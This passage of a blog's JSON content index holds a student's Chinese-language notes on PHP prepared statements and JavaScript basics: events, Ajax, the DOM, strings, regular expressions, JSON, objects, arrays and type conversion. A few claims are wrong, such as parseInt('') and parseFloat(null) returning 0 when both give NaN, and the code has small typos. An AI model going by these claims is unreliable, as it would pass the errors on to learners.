$password代替？ 从而组成完整的SQL语句。ss是代表类型。每个参数类型都是字符型，用s表示，两个参数，因此是ss。 $username = &apos;ggy&apos;; $password = &apos;666&apos;; $stmt-&gt;execute(); //将参数值代替？，然后执行SQL语句。 $username = &apos;ggg&apos;; $password = &apos;666&apos;; $stmt-&gt;execute(); $stmt-&gt;close(); $conn-&gt;close();由于已经设定了预处理模板，那么之后就可以任意的设定参数值然后传进去执行。","categories":[{"name":"PHP学习","slug":"PHP学习","permalink":"https://ggyggy666.github.io/categories/PHP%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP连接MySQL数据库操作--面向对象","slug":"PHP连接MySQL数据库操作-面向对象","permalink":"https://ggyggy666.github.io/tags/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"}],"keywords":[{"name":"PHP学习","slug":"PHP学习","permalink":"https://ggyggy666.github.io/categories/PHP%E5%AD%A6%E4%B9%A0/"}]},{"title":"Js学习（五）","slug":"Js学习（五）","date":"2020-05-05T13:38:29.000Z","updated":"2020-05-06T09:02:28.400Z","comments":true,"path":"2020/05/05/Js学习（五）/","link":"","permalink":"https://ggyggy666.github.io/2020/05/05/Js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/","excerpt":"昨天又顾着玩耍了，今天继续学习。","text":"昨天又顾着玩耍了，今天继续学习。 事件在需要页面做出响应时就需要监测到事件。比如form表单提交时，可以在标签里使用onsubmit属性，然后值就是调用一个函数。也可以form外先获取到form这个元素，再使用xx.onsubmit这样设置一个函数。这样是设置好了提交时候才会触发，而如果是监听事件的话，就可以对每一个事件进行相应响应。 注册事件addEventListener使用到addEventListener()。 &lt;form id=&quot;myForm&quot;&gt;&lt;/form&gt; var myForm = document.getElementById(&quot;myForm&quot;); myForm.addEventListener(&quot;submit&quot;,function() { console.log(&quot;表单提交中&quot;); });这个就是设置submit时触发，可以是其它事件。 文档加载load使用onload，在加载文档时触发。 鼠标事件在使用时前面加个on就行。 键盘事件 keydown, 按下键盘，如果一直不放会一直触发。 keyup, 释放键盘。 keypress, 按下后释放键盘。 这三个事件的值是调用一个函数，该函数的参数是一个event，使用event.which，会知道你按下的那个键对应的unicode编码是什么。 &lt;body onkeydown=&quot;downEvent(event)&quot;&gt; &lt;/body&gt; &lt;script&gt; function downEvent(event) { console.log(&quot;编码是:&quot;+event.which); } &lt;/script&gt;表单事件 change, 当当前元素失去焦点而且其内容改变了会触发。就是说当在文本框里输入东西后，鼠标点击了其它地方。 select，这个不是下拉的那个选择框，是使用鼠标滑动选择文本框的什么内容。要想打印选择的内容，可以用window.getSelection().toString()。 &lt;input type=&quot;text&quot; value=&quot;赵钱孙李，周吴郑王&quot; onselect=&quot;selectEve()&quot;/&gt; &lt;script&gt; function selectEve() { console.log(window.getSelection().toString()); } &lt;/script&gt;事件冒泡事件冒泡是：当你点击一个标签内容时，触发该标签中的事件，但这个标签又在一个div中，那么也会触发这个div的事件，而这个div又在一个div中…沿着树形结构往父节点上触发事件。如果只想触发点击的那个标签的事件，就得在该标签的事件调用的函数里面的最后一行使用： window.event?window.event.cancelBubble=true:event.stopPropagation(); 浏览器对象其实就是使用window.xxx。 定时器 window.setTimeout(a, b)，指定函数a在b毫秒后执行一次。 window.clearTimeout(id), 定时器需要一个变量承载，就是id（某个变量名而已，用来标识某个定时任务）。然后可以根据id清除这个计时器，就不会触发定时任务。 window.setInterval(a, b)，指定每隔b毫秒就执行a函数。 location对象window.location记载了浏览器当前所在窗口的信息。比如：window.location.href就能跳转到指定网站。 对话框 alert(), 弹出一个警告框，只有“确认”。 confirm(), 弹出确认框，有“确认”和“取消”，分别根据点击的不同返回true或者false。 prompt(a, b), 弹出一个输入框，需要用户输入信息后点“确认”或“取消”。a是输入框的提示语，b是输入框默认的内容。 窗口 打开浏览器窗口。window.open(url,name,specs,replace)。URL是打开的网站地址，name确定是以什么方式打开窗口。可选值有：_blank,_self。前者会打开一个新窗口，后者还是在这个窗口打开。spec用来控制窗口的宽高。replace用来控制打开的窗口在历史记录中怎么显示。 关闭窗口。上面打开窗口会有一个返回值，如：w=window.open(&quot;xx&quot;), 然后使用w.close()即可关闭。 Ajax异步的JavaScript和xml，可以在不重新加载整个页面的前提下刷新页面数据。使用Ajax的步骤： 创建XMLHTTPRequest对象。 需要适配不同浏览器，那么需要创建不同对象。 var xmlhttp; if(window.XMLHttpRequest){ xmlhttp = new XMLHttpRequest();//XMLHTTPRequest适用于谷歌、火狐、IE7+等浏览器 } else{ xmlhttp = new ActiveXObject(&quot;Microsoft XMLHTTP&quot;) //只适用于IE5和IE6 } 向服务器发送请求 GET方式 xmlhttp.open(“GET”,url,true); xmlhttp.send();使用GET方式，后面的true代表允许异步进行，URL可以是一个服务器上的文件路径，而且后面可以跟参数方便接收。如 xmlhttp.open(“GET”,”./xxx.php?q=”+str, true);后台PHP文件就可以通过q获取值，str可以是自己定义的值。 POST方式 xmlhttp.open(“POST”,”./xxx.php”，true); xmlhttp.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”); xmlhttp.send(“q=test”);由于是post方式，URL就不能是带参数，转变为send中发送参数。而且可以设置http头，Content-type可以改为其它头部。 服务器响应 onreadystatechange事件，当readyState改变时就触发。使用这个可以当检测到readyState=4而且status是200时就返回信息并进行操作。 xmlhttp.onreadystatechange=function(){ if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200){ document.getElementById(&quot;xx&quot;).innerHTML=xmlhttp.responseText; } } 注意，responseText就是返回的信息，格式是字符串，如果是responseXML，就是xml格式的了。而且后台PHP文件必须有echo才能返回信息并接收到。","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Js学习（五）","slug":"Js学习（五）","permalink":"https://ggyggy666.github.io/tags/Js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/"}],"keywords":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}]},{"title":"Js学习（四）—— 类、错误处理、DOM","slug":"Js学习（四）","date":"2020-05-03T06:18:12.000Z","updated":"2020-05-03T07:55:57.474Z","comments":true,"path":"2020/05/03/Js学习（四）/","link":"","permalink":"https://ggyggy666.github.io/2020/05/03/Js%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/","excerpt":"今天继续学习JS。","text":"今天继续学习JS。 Math类JS中也需要用到一些数学方法，通过使用Math类即可。 向上取整：Math.ceil(x) 向下取整：Math.floor(x) 随机数：Math.random() 平方根：Math.sqrt(x) 四舍五入：Math.round(x) 求最值：Math.max(a,b,c…)和Math.min(a,b,c…),参数不限。 Date类 首先定义一个时间：var x=new Date()； x.getFullYear(), 返回x对应的年份。 x.setFullYear(year, month, day)，设置年份，month和day可选。 x.getMonth(), 返回x的月份 x.setMonth(month, day), 设置月份，day可选。 x.getDate()，返回x在一个月中的第几天。 x.getDay(), 返回x在一周的第几天。 x.setDate(day), 设置一个月的第几天。 x.toString()，将日期转为字符串。 捕获和处理错误JS的捕获错误其实跟其他语言类似。也是用try-catch,throw。如： try{ ... }catch(err){ console.log(err.message); //通过使用err.message返回错误信息。 }但是这个错误信息是原本就被定义了的，如果使用自定义的错误，那么需要new Error(“错误信息…”)，而且是使用throw抛出的。如： try{ ... throw new Error(&quot;错误&quot;); }catch(err){ console.log(err.message); //通过使用err.message返回自定义的错误信息。 }DOMDOM是一个文档对象模型，组成文档的对象通过树形结构连接在一起，表示层次关系。文档元素就是一个标签以及之间的内容，对应一个对象。所以节点树就是HTML的元素的结构。根节点是html标签，然后是head、body标签…如果要使用js去对文档元素进行操作，首先就得获取到这个文档元素。 获取文档元素 通过id。document.getElementById(“”). innerText是开始标签与闭合标签之间的内容。 通过类名。var s = document.getElementsByClassName(“”). 注意同一个类名的标签不唯一。因此返回的是一个数组，需要使用s[0],s[1]…获取到对应的元素。 通过标签名。var s = docuemnt.getElementsByTagName(“div”). 同样返回的是数组。 通过document.querySelector(“.类名”), 这个需要满足有类名，而且这个类有css样式，所以才会是.类名。而且只返回第一个元素。需要用querySelectorAll()返回所有匹配的元素。 节点树的操作首先获取一个元素节点：var s = document.getElementById(“”); 获取第一个子节点。var s1 = s.firstElementChild; 获取最后一个子节点：var s2 = s.lastElementChild; 获取前一个兄弟节点：var s3 = s2.previousElementSibling; 当然第一个节点没有前一个兄弟节点。 获取后一个兄弟节点：var s4 = s1.nextElementSibling; 当然最后一个节点没有兄弟节点。 子节点列表：children,是一个数组，需要使用：s.children[0]…获取它的长度：s.children.length; 获取和设置属性有两种方法。 通过使用: s.属性名，返回的是这个属性对应的值（数值或者字符串等）。可以用s.属性名=xxx，直接赋值。 使用getAttribute(), 如：s.getAttribute(“属性名”). 返回的是字符串。相反，可以用s.setAttribute(“属性名”,”属性值”). 需要注意，如果属性名是class等，不能直接用s.class, 用s.className, 而可以直接使用：s.getAttribute(“class”) 节点的操作建立在父节点与子节点的基础上。 创建节点：document.createElement(“a”),a是超链接标签名。 插入节点：一：插入到最后一个子节点中。node1.appendChild(node)。二：插入到某个节点前面。父节点.insertBefore(node1,node2)，将node1插进父节点的子节点中，并且排在node2前面。 删除节点。父节点.removeChild(子节点)。 替换节点。父节点.replaceChild(a,b)。将a替换掉b节点。","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Js学习（四）","slug":"Js学习（四）","permalink":"https://ggyggy666.github.io/tags/Js%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"}],"keywords":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}]},{"title":"Js学习（三）","slug":"Js学习（三）","date":"2020-05-02T07:18:40.000Z","updated":"2020-05-02T14:50:25.624Z","comments":true,"path":"2020/05/02/Js学习（三）/","link":"","permalink":"https://ggyggy666.github.io/2020/05/02/Js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"昨天五一浪了一天，都没有时间学习。今天继续学习JS。","text":"昨天五一浪了一天，都没有时间学习。今天继续学习JS。 字符串的常用操作方法查找字符串的位置 首先约定一个长的字符串为a, 要查找的短的字符串为b。查找字符串b在a中的位置有两种办法，一个是从前往后找，使用indexOf()，即：a.indexOf(b)，返回b在a中首次出现的位置，如果没有找到，返回-1. 当然可以指定从哪个位置开始查找, 即：a.indexOf(b,4)；另一种就是从后往前找，使用lastIndexOf()，用法跟indexOf一样，只是方向反了而已。 返回字符串指定位置的字符 使用charAt()。若一个字符串为a, 那么可以 a.charAt(0)，返回它的第一个字符。 截取字符串截取字符串有三种方法，slice(a,b),substring(a,b),substr(a,b)。 slice(a,b), 截取从a到b-1位置的字符串并返回，注意不是截取到b位置。如果是负数，就从后数位置。 substring(a,b), 与slice有些差别。如果a或b为负数时，不是从后数，而是直接转为0，而且如果a&gt;b，会自动转换成substring(b,a)，也就是说，只能从前往后截取。 substr(a,b)。a是开始截取的位置，b是要截取的长度。 大小写转换 假定字符串是a，那么转换成大写：a.toUpperCase(); 转换成小写：a.toLowerCase()。 分割字符串之前知道，将数组元素使用join可以连接成一个字符串，而现在使用split()可以将字符串分割，并返回一个数组。 split(a,b), a就是根据字符串中的某些字符来分割，b是返回的数组的最大长度。例如： var str = &quot;010203&quot;; var str.split(&quot;0&quot;) --&gt; [&quot;1&quot;, &quot;2&quot;, &quot;3&quot;] var str.split(&quot;0&quot;, 2) --&gt; [&quot;1&quot;, &quot;2&quot;]正则表达式首先需要创建正则表达式。 创建一个RegExp对象。如：`var pattern = new RegExp(“表达式”)。 直接使用//创建表达式。如：`var pattern = /表达式/。注意没有双引号。 创建好后，需要使用它进行匹配。此时用到test()方法。如：`pattern.test(“字符串”)。即在字符串中使用pattern的表达式值去匹配。返回true或者false。注意一些特殊符号： 匹配字符 可以使用[a-z]匹配小写字母，[0-9]匹配数字，当然可以联合起来：[0-9a-zA-Z], 匹配数字或者字母中的一个。注意这样只是匹配一个。在中括号里，范围前加^表示取反。如：[^0-9],匹配不是数字的字符。 使用特定的表示，如： 匹配多个字符上面的只是匹配一个，可以使用{}设置匹配数。 可以知道，+,?这些都有特定含义，而如果想要匹配+,?这些字符，得用到转义符\\。 选择匹配的表达式可以使用|选择匹配。如：[0-9]|[a-z], 可以选择匹配数字或者小写字母，就是“或”的意思。如果要限定某处才使用|，可以使用（）括起来。如：(0|1)ab, 那么可以匹配0ab或者1ab。 分组表达式使用（）。前面的+,?等都是针对紧邻的那个字符，如果需要对很多字符进行匹配，那么使用（）括起来。如：(hello){2},匹配重复两次的hello。 引用使用（）分组后，会默认有编号，第一个（）就是编号1，第二个（）就是编号2……然后可以在后面使用\\1，\\2进行引用前面匹配到的字符。注意，引用匹配的字符是跟前面（）匹配的字符一样的，并不是单单引用表达式。例如： ([0-9])AA\\1, （）里匹配一个数字，如果匹配到了1，那么后面\\1匹配到的也必须是1. 最终的匹配就是：1AA1。 匹配位置 ^+表达式，表示必须以这个开头。如：^[0-9], 表示以数字开头，注意跟[^0-9]不一样。 表达式+$, 表示必须以这个结尾。 ggy$, 表示以ggy结尾。 \\bggy\\b, \\b表示单词边界，匹配到的就是ggy独立单词，而不是aggya这种。如果是大写的\\B，就是不是单词边界。匹配到的就是aggya，而不是ggy了。 修饰符在//后面使用，有i,g,m三种。 i. 表示不考虑字母大小写。如：/^Edu/i，可以匹配到edu。 g. 表示匹配所有满足表达式的字符串。将匹配到的字符串整合成一个数组返回。 m。表示多行模式。当字符串很长，分为很多行时，可以使用m。这样^匹配的就不仅是字符串的开头，而是每一行的开头。如果想同时匹配两行之间的内容，可以加上\\n。如：aa\\nbb。就可以匹配到一行结尾是aa,下一行的结尾是bb。匹配到返回true，反之。 使用正则表达式使用到search(),split(),replace()。 search(a). a是正则表达式，如：str.search(a)。表示使用表达式去匹配str，然后在str中搜索匹配到的字符，并返回出现的第一次位置。没匹配到返回-1. split(a), 本来split就是根据里面的字符进行分割，只不过现在使用表达式去匹配到那个字符而已。 replace(a,b)。使用b替换掉表达式a匹配到的第一个字符串。如果表达式后有g，就是替换所有匹配到的字符串了。 JSONJSON是用来传递数据的，常用的数据格式有：JSON对象，JSON数组和JSON字符串。 JSON对象JSON对象用来传输数据，跟JavaScript对象有点相同，也是以键值对存储。只是它的属性名必须得用双引号引起来，而且里面的值不能是一个方法，但可以是很多类型。{&quot;a&quot;:1,&quot;b&quot;:2.12,&quot;c&quot;:true,&quot;d&quot;:&quot;string&quot;,&quot;e&quot;:null};。调用属性方法跟js对象一样。 JSON数组其实就是键值对中的值是一个数组。然后调用时，只能按照对象名.属性名[x]来用。如： var myJson = { &quot;country&quot;:&quot;China&quot;, &quot;population&quot;:&quot;1.3billion&quot;, &quot;bigCity&quot;:[&quot;Peking&quot;,&quot;Shanghai&quot;,&quot;ShenZhen&quot;,&quot;HongKong&quot;] } console.log(myJson.bigCity[1]);//打印出Shanghai myJson.bigCity[0] = &quot;GuangZhou&quot;;//第一个元素被赋值为GuangZhouJSON字符串JSON对象是不能传递的，需要转为字符串才可以传。在对象左右两边加上’就是字符串了。 JSON字符串转为JavaScript对象。使用JSON.parse(a,b)，a就是JSON字符串，b是一个可选函数参数，在转为对象后，可以对对象的所有属性进行遍历然后做一些操作。如： //对象的每一个属性的值加1 var text = &apos;{ &quot;key1&quot;:1, &quot;key2&quot;:2, &quot;key3&quot;:2.2}&apos;; var obj = JSON.parse(text, function (key, value) { if(key === &apos;&apos;)//当遇到对象本身时，不进行加1操作 return value; return value+1;//对属性值加1 }); console.log(obj);//输出Object {key1: 2, key2: 3, key3: 3.2} JSON对象转为字符串。使用JSON.stringify(a,b,c), a是对象，b、c是可选参数。b可以是函数，对对象进行操作，之后才转为字符串；也可以是一个数组，数组里是属性名，表示要转换哪些属性。如： //转换对象中特定的属性 var JSONObject = {&quot;k1&quot;:1,&quot;k2&quot;:2.2,&quot;k3&quot;:3}; var JSONString = JSON.stringify(JSONObject,[&quot;k1&quot;,&quot;k2&quot;]); console.log(JSONString);//输出{&quot;k1&quot;:1,&quot;k2&quot;:2.2}，只转换了k1,k2。 而c就是设置转为字符串后的显示格式。如： var str = {&quot;name&quot;:&quot;Tom&quot;,&quot;age&quot;:16}; var obj = JSON.stringify(str, null, 4）； console.log(obj);之后就会输出： { &quot;name&quot;: &quot;Tom&quot;, &quot;age&quot;: 16 }c等于4时，缩进了4个空格。有个规则，当c&lt;10时，就会按照设置的c的值缩进相应的空格数，而c&gt;=10时，就只会缩进10个空格了。","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Js学习（三）","slug":"Js学习（三）","permalink":"https://ggyggy666.github.io/tags/Js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"}],"keywords":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}]},{"title":"Js学习（二）","slug":"Js学习（二）","date":"2020-04-29T12:29:45.000Z","updated":"2020-04-30T11:07:46.596Z","comments":true,"path":"2020/04/29/Js学习（二）/","link":"","permalink":"https://ggyggy666.github.io/2020/04/29/Js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"今天继续总结。","text":"今天继续总结。 简述JavaScript是一门基于对象的语言，一切皆为对象。分为内置对象（字符串、数字等）与自定义对象（用户自定义）。自定义对象是数据和函数的集合，数据是变量名和变量的值构成的组合。 创建对象通过对象字面量创建 其实就是python的字典，用大括号括起来，里面是键值对。如：var song={name:”ggy”, time:”180”};注意，键值对之间用逗号隔开，最后一个没有逗号。因为是定义对象，最后需要分号。 通过new创建 直接new一个对象出来，然后使用对象名.属性名=“属性值”的方式往这个对象里面添加键值对。如：var s = new Object();s.name = “ggy”;s.height = 180; 通过普通函数与new创建 其实就是通过new，只不过将创建的对象放在一个函数里面，然后调用函数时传参数进来, 然后返回创建的对象罢了。如： function createObject(name, height){ var s = new Object(); s.name = name; s.height = height; return s; } var s1 = createObject(&quot;ggy&quot;, 180);通过构造函数与new创建 构造函数与普通函数的差别在于它本身就指向一个对象，其函数名就是对象名，因此无需创建对象并返回，而且如果形参名与自身属性名相同，需要使用this。就如c++那样。如： function Store(name, height){ this.name = name; this.height = height; } var myStore = new Store(&quot;ggy&quot;, 180);通过原型(prototype)与构造函数创建 创建一个函数时，自动拥有一个prototype属性，这个属性的值就是一个对象，称为该函数的原型对象。类似于继承，有子类和父类。通过子类prototype就可以追溯到它的父类。如果我们定义了它的父类的属性和值，那么可以拥有多个既有父类属性又具有自己独特属性的子类。这样重复属性只需要父类定义就好，节省内存。 function Store(){ Store.prototype.name = &quot;ggy&quot;; Store.prototype.height = 180; } var myStore1 = new Store(); var myStore2 = new Store(); myStore2.name = &quot;ggg&quot; //覆盖父类的name值。对象的属性的增删改查获取属性 通过使用对象名.属性名 通过使用对象名[“属性名”]。注意，如果属性名含有空格，必须使用第二种。 修改属性值 直接通过赋值，即：对象名.属性名 = 新值。这种方式也可以增加键值对。 删除属性 使用delete。只能删除该对象自有属性，不能删除原型属性。如果该对象被其它对象继承，也不要删除被继承的属性。如： var s = new Object(); s.name = &quot;ggy&quot;; s.height = 180; delete s.name //删除成功 delete s.prototype; //删除失败，不是自有属性检测对象是否有某个属性以及枚举属性检测对象是否有某个属性 使用&quot;属性名&quot; in 对象名。返回true或者false。 使用hasOwnProperty()方法，如： 对象名.hasOwnProperty(“属性名”). 返回true或者false。 枚举属性 使用for循环。如：for(var att in s) att就是属性名。 使用Object.getOwnPropertyNames(“对象名”)，以字符串数组形式返回所有自有属性的名字（不考虑能否枚举）。 使用Object.keys(“对象名”), 以字符串数组形式返回所有可枚举的自有属性的名字。 数组 数组内可以是任意类型的数据，获取数组长度可以直接用: 数组名.length。 其它读写与c语言没什么区别。不过这里一维数组不会溢出，因为就算超出了原有空间，还是可以在赋值时动态自己创建空间。比如数组a只有5个长度（0-4），可以a[5]=3这样。 数组元素的增加 直接在尾部赋值增加。`a[a.length]=5; 使用push往尾部增加。a.push(6), 返回新的数组长度。 在头部增加元素。a.unshift(6), 返回新的数组长度。 数组元素的删除 直接将数组长度变小，就能删除后面的元素。 使用delete删除，delete a[4];，但是只是删除那个值，会留有一个空占位符，数组长度不变。 使用pop删除。a.pop()，每次删除后面的一个元素，返回被删除的该元素。 在头部删除。a.shift();，每次删除头部一个元素，返回被删除的元素。 多维数组的创建数组遍历和读写就不提了，与c语言一样。 直接创建。var a = [[1,2],[3,4]]; 只知道数组长度，使用new分配空间。如：var a = new Array(4);for(var i=0; i&lt;4; i++){a[i] = new Array(6);} 数组的常用方法查找元素的下标使用indexOf()和lastIndexOf(), 前者是从前往后找，后者是从后往前找，找到第一个就返回。如： var a=[1,2,3]; a.indexOf(&quot;1&quot;); a.lastIndexOf(&quot;1&quot;); a.IndexOf(&quot;1&quot;,-1)-1即第二个参数是可选的，代表从哪个位置开始找。如果是负数，就是倒数的位置。 数组的合并使用concat()，格式是数组a.concat(数组b). 返回的是链接后的新数组。 数组倒置使用reverse(), 格式是数组a.reverse()，注意这是就地倒置，即不会返回新数组，直接在a中倒置元素。 数组元素连接成字符串使用join()。括号内可选择连接的分隔符。如： var a = [&quot;ggy&quot;, &quot;ygg&quot;]; a.join() //括号内什么都没有，是默认,分隔，即：ggy,ygg a.join(&quot;+&quot;); //返回的就是: ggy+ygg元素排序使用的是sort()。注意： 如果括号内不带参数，会把数组里的元素（不管是数字还是字符型）都当做字符型来排序。如：1,2,10. 排序后的结果是1,10,2.如果括号内带参数，这个参数得是一个匿名函数。这样排序就是真正按正常的值大小来排序了。如： var a = [1,2,10,5]; a.sort(function(a, b){return a-b;}); //升序排序 a.sort(function(a, b){return b-a;}); //降序排序提取子数组使用slice()，返回切割出来的子数组部分，不会影响原来的数组。slice内可以有参数，可选切割的起点和终点。如： var a = [1,2,10,5]; a.slice(0, 3); //[1,2,10]. 注意，下标范围是：0&lt;=x&lt;3, 即0,1,2不加第二个参数就取到数组末尾；负数就从后算起。 条件语句if-else忽略，讲一下switch。 var a=1; switch(表达式如：a){ case 值：语句；break; ... default: 语句; }表达式是一个已经赋有值了的变量。而case后的值的数据类型是可以数字或者字符等。 循环语句while, do while, continue和break忽略，讲一下for in。 for in主要用于枚举对象的可枚举的属性名（包括继承得到的可枚举属性名）。如： var s = {name: &quot;ggy&quot;, height: 180}; for(var att in s){ console.log(att) //输出name, height }有一点得注意：求素数的时候，会用到Math.sqrt(n)。c语言通常会使用int强制转换成整数，但JS是用parseInt()，要记得！即：parseInt(Math.sqrt(n)); 函数正常的function 函数名(参数){}忽略。 匿名函数匿名函数就是在定义一个函数时，除了没有名字外，其它函数组成部分都拥有。而我们要想调用它，得把这个匿名函数赋值给一个变量，这个变量就相当于函数的名字了，然后就可以正常调用。如： var s = function(a,b){ return a&gt;b?a:b; }; console.log(s(1,2)); //使用变量名作为函数名正常调用。这个是匿名函数，但如果函数有名字，又把它赋值给一个变量，那就相当于给函数换一个名字了。如： var s = function max(a, b){ return a&gt;b?a:b; }; console.log(s(1,2)); //换一个名字后，只能用s调用，不能用max了。调用对象里的函数对象里的函数作为值，也是匿名函数，通过键（属性名）来作为函数名调用。如： var s = { name: &quot;ggy&quot;, getMax: function(a, b){return a&gt;b?a:b;} }; console.log(s.getMax(1,2)) //键的值作为函数名调用。 console.log(s[&quot;getMax&quot;](1,2); //也可以这样调用。实参数小于形参数当传进的实参数（如2）小于形参数（如3）时，会默认从左到右匹配，那么第3个没有实参传进来的形参的值就会是undefined。当然，没有值的话实参可以传undefined进去。例如： function s(a, b, c){..} s(1,2) //此时c为undefined s(undefined, 1, 2) //此时a为undefined这样子不够严谨，需要使用：给被传入undefined的形参设定一个默认值。 function s(a, b, c){ if(c === undefined) //注意是三个等号 c = 0; //c默认值就是0 ... } s(1,2); //a=1, b=2, c=0实参对象如果不知道形参与实参数是否能匹配，那么就可以用的实参对象arguments。它可以看成一个数组（非真正数组），传进来的实参会一一保留进这个数组中，然后也可以按数组方式正常调用。如： function sum(){ //没有形参 var len = arguments.length; //获得该对象数组的长度（传进来的实参数目） var sum = 0; for(var i=0; i&lt;len; i++){ sum += arguments[i]; //正常访问数组 } return sum; } console.log(sum(1,2,3,4,5)); //传多少个实参都行对象作为参数传一个对象进去，就可以直接调用里面的属性，注意函数中修改了对象里的值，这个对象的值就真正的是被修改了的。适合属性非常多时，就放在一个对象里。如： function myFunction(obj) { console.log(obj.name); obj.number++; return obj.number; } myObj = {name:&quot;myObj&quot;,number:34}; //定义一个对象 myFunction(myObj); //传对象名进去 console.log(myObj.number); //输出35，number值在函数中被加1了。一个函数作为另一个函数的参数其实就是把一个函数名作为实参传进另一个函数。如： function getMin(a,b) { return a&lt;b?a:b; } function getM(func,num1,num2) { return func(num1,num2); //就可以根据函数名调用另一个函数了 } getM(getMin, 1, 2); //getMin传进去","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Js学习（二）","slug":"Js学习（二）","permalink":"https://ggyggy666.github.io/tags/Js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"}],"keywords":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}]},{"title":"Js学习（一）","slug":"Js学习（一）","date":"2020-04-29T04:43:52.000Z","updated":"2020-04-29T08:38:46.593Z","comments":true,"path":"2020/04/29/Js学习（一）/","link":"","permalink":"https://ggyggy666.github.io/2020/04/29/Js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"在写完登录界面后，这几天一直在学习JS。现已初步学完基础，特此总结。","text":"在写完登录界面后，这几天一直在学习JS。现已初步学完基础，特此总结。 简述JavaScript是一门动态语言，包含三部分：ECMAScript、浏览器对象模型（BOM）和文档对象模型（DOM）。ECMAScript是一种脚本语言的标准，比如定义了声明变量、操作数组等语法。BOM可直接操作浏览器，通常就是使用window.xxx操控。DOM就是网页文档的结构，为树形结构，HTML中的各个标签就是这棵树上的节点。 嵌入JS代码 放在&lt;script&gt; &lt;/script&gt;中, 这个标签有可以放在head或者body中。通过&lt;script src=&quot;xxx.js&quot;&gt; &lt;/script&gt;导入一个外部的js文件。 注释 单行注释：//多行注释：/* */ 输出模式 弹出对话框模式： alert() //弹出一个框控制台模式： console.log() //F12-&gt;console 可看到输出页面输出模式：document.write() //直接写在页面 变量声明 使用var来声明变量。没有C语言那种int,char类型。JS会自动根据值来转换成相应的类型。变量有全局和局部的。局部的会覆盖全局的。但是有一点需要注意，就是申明提前。例子： var s = 1; //全局function test(){ console.log(s); //不会输出1，会输出undefined; var s = 2; //声明局部变量； console.log(s); //输出2.} 为什么不是输出1呢，这是因为，虽然s是后面才声明的，但会被提前声明，即var s;。此时这个局部变量会覆盖掉全局变量，但是又没有赋值，因此输出undefined。但是后面的var s=2就赋值了，因此输出了2. 数据类型数字型 整数和浮点数不区分。支持16进制的整数，在数字前面加上0x或者0X即可。支持科学计数法：2e3 -&gt; 2000 字符串 内容使用’’或者””引起来的。如果内容中带有’或者”需要直接显示，得使用\\转义。 布尔型 true 或 false 数组 由于var定义变量时不用考虑类型，因此数组也不分整型和字符型。数组里面的内容的类型可以是任意的。比如：var array = [1, “ggy”, true]; null和undefined null是一个空对象的引用，没有声明一个变量就调用它就会出现错误。undefined是在声明了一个变量后，没有给它赋值，而后面又调用了它导致的。 对象类型 类似python中的字典，有键有值，一一对应。如: var student = { name: &quot;Peter&quot;, age: 23, gender: male };注意，键值对后面跟的是逗号，最后一个键值对不用。因为是定义一个对象，最后需要分号。要调用对象了的值，有两种方式： 通过对象名.键名调用，如：student.name,返回的就是Peter。 通过对象名[“键名”]调用，如：student[“name”]; 数据类型转换字符串转整数 使用parseInt(a, b)来进行转换，a是待转换的字符串，要转成整数，a必须是以数字开头的字符串，在转换成整数时，只转前面数字的部分，转到后面第一个非数字的字符时会立即停止转换。b是待转换字符的进制，是可选的。如果是16进制，前面就会有0x，那么前面说的就该变成遇到0x之后的第一个非数字字符就停止。比如： parseInt(“12”) –&gt; 12parseInt(“12.2”) –&gt; 12parseInt(“C”, 16) –&gt; 12parseInt(“12a2”) –&gt; 12parseInt(“0xC”) –&gt; 12parseInt(“a12”) –&gt; 失败parseInt(“”) –&gt; 0 使用Number()进行转换, 必须是纯数字的字符串，不能含有其他字符（可以是布尔型的true)。如： Number(“12”) –&gt; 12Number(“12a2”) –&gt; NaN （不是一个数字） 字符串转小数 同样有parseFloat()和Number()两种。parseFloat()只转换字符中的以数字开头的整数或者浮点数，后面跟着的字符忽略（比如第二个.）。如： parseFloat(“12”) –&gt; 12parseFloat(“12.2a”) –&gt; 12.2parseFloat(“12.2.2”) –&gt; 12.2parseFloat(null) –&gt; 0 数字转成字符串 用toString(a)和String()。a是可选的，代表该数字的进制。如： var s = 15;s.toString(); –&gt; “15”s.toString(16); –&gt;”F” (s是16进制的了。）String(s) –&gt; “15” 